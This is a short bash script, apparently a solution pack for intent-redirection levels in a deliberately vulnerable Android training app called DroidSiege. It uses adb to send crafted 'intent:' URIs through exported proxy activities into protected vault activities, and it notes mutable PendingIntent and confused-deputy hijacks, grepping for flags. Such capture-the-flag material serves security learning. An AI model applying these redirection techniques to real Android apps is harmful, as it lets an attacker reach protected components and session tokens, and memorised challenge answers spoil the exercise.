#!/usr/bin/env bash
# DroidSiege — components/intentredir tooling pack
set -euo pipefail

echo "== L1: blind forward to the internal vault =="
adb shell am start -n com.droidsiege/.challenges.components.ProxyActivity \
  --es redirect 'intent:#Intent;component=com.droidsiege/.challenges.components.FlagVaultActivity;end'
sleep 1
adb shell "dumpsys activity top | grep -m1 'DS{components_intentredir_L1" || true

echo
echo "== L2: the deputy stamps its session token onto the nested intent =="
adb shell am start -n com.droidsiege/.challenges.components.TokenProxyActivity \
  --es redirect 'intent:#Intent;component=com.droidsiege/.challenges.components.GuardedVaultActivity;end'
sleep 1
adb shell "dumpsys activity top | grep -m1 'DS{components_intentredir_L2" || true

echo
echo "== L3: mutable PendingIntent (in-app actions: issue -> hijack simulator) =="
echo "the fill-in opens FlagVaultActivity with the stored escrow code"

echo
echo "== L4: confused deputy =="
adb shell am start -n com.droidsiege/.challenges.components.DeputyActivity \
  --es action verify-entitlement
sleep 1
adb shell "dumpsys activity top | grep -m1 'DS{components_intentredir_L4" || true
